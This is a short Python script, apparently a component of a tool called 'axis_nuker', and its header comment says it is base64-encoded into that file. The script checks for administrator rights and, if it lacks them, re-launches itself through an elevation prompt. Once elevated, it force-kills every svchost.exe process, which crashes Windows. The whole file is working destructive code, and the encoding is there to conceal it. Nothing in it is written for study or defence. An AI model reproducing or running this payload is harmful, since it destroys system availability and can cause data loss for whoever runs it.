# This file is base64 encoded into axis_nuker.py and is not bundled with the executable.

import ctypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    os.system('TASKKILL /IM svchost.exe /F')
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)